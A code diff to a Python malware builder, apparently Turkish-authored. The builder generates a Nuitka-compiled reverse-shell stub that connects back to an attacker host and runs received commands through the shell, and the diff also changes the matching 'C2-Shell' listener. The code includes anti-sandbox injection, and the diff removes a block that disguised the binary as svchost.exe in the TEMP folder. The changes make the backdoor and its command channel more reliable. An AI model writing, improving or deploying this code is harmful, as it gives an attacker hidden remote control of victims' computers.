@@ -336,40 +336,41 @@ except:
 """
 
         # Nuitka native C'ye derlediği için XOR'a gerek yok — kod zaten native binary'de gizli
-        stub_code = f"""import socket,os,time,sys,shutil
+        stub_code = f"""import socket,os,time,sys
 import subprocess as _sp
-if sys.stdout is None:
-    sys.stdout=open(os.devnull,"w")
-if sys.stderr is None:
-    sys.stderr=open(os.devnull,"w")
-_NW=0x08000000
-if "--bg" not in sys.argv:
-    _t=os.path.join(os.environ.get("TEMP","."),"svchost.exe")
-    try:
-        shutil.copy2(sys.argv[0] if not getattr(sys,"frozen",False) else sys.executable,_t)
-        _sp.Popen([_t,"--bg"],creationflags=_NW)
-    except:pass
-    sys.exit(0)
+import shutil
+try:
+    if sys.stdout is None: sys.stdout=open(os.devnull,"w")
+    if sys.stderr is None: sys.stderr=open(os.devnull,"w")
+except: pass
 {anti_sb_code}
 def _r():
     while True:
         try:
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+            s.settimeout(60)
             s.connect(("{lhost}",{lport}))
+            s.settimeout(None)
             while True:
-                d=s.recv(4096).decode("utf-8","replace").strip()
+                d=s.recv(4096)
                 if not d:break
+                cmd=d.decode("utf-8","replace").strip()
+                if not cmd:continue
                 try:
-                    p=_sp.run(d,shell=True,capture_output=True,text=True,timeout=30,creationflags=_NW)
+                    p=_sp.run(cmd,shell=True,capture_output=True,text=True,timeout=30)
                     o=p.stdout+p.stderr
-                    if not o:o="(bos cikti)\\n"
+                    if not o:o="\\n"
                 except Exception as e:
                     o=str(e)+"\\n"
-                o+=os.getcwd()+"> "
-                s.send(o.encode("utf-8","replace"))
+                try:
+                    o+=os.getcwd()+"> "
+                except:
+                    o+="> "
+                s.sendall(o.encode("utf-8","replace"))
             s.close()
         except:
-            time.sleep(5)
+            pass
+        time.sleep(5)
 _r()
 """
         save_text(stub_path, stub_code)
@@ -458,16 +459,36 @@ def c2_listener():
         s.listen(1)
 
         conn, addr = s.accept()
+        conn.settimeout(30)
         print(f"{C.RED}{C.BOLD}  [!] BAĞLANTI GELDİ: {addr[0]}:{addr[1]}{C.RESET}\n")
 
         while True:
-            cmd = input(f"{C.RED}C2-Shell>{C.RESET} ")
-            if cmd.lower() in ['exit', 'quit']:
+            try:
+                cmd = input(f"{C.RED}C2-Shell>{C.RESET} ")
+                if cmd.lower() in ['exit', 'quit']:
+                    break
+                if len(cmd) > 0:
+                    conn.sendall(cmd.encode("utf-8") + b"\n")
+                    # Yanıtı tam al
+                    response = b""
+                    while True:
+                        try:
+                            chunk = conn.recv(4096)
+                            if not chunk:
+                                print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
+                                break
+                            response += chunk
+                            if b"> " in chunk:
+                                break
+                        except socket.timeout:
+                            break
+                    if response:
+                        print(f"{C.WHITE}{response.decode('utf-8', errors='replace')}{C.RESET}", end="")
+                    else:
+                        break
+            except (ConnectionResetError, BrokenPipeError):
+                print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
                 break
-            if len(cmd) > 0:
-                conn.send(str.encode(cmd + "\n"))
-                client_response = str(conn.recv(4096), "utf-8", errors="replace")
-                print(f"{C.WHITE}{client_response}{C.RESET}", end="")
     except KeyboardInterrupt:
         print(f"\n{C.YELLOW}  [*] Dinleme iptal edildi.{C.RESET}")
     except Exception as e:
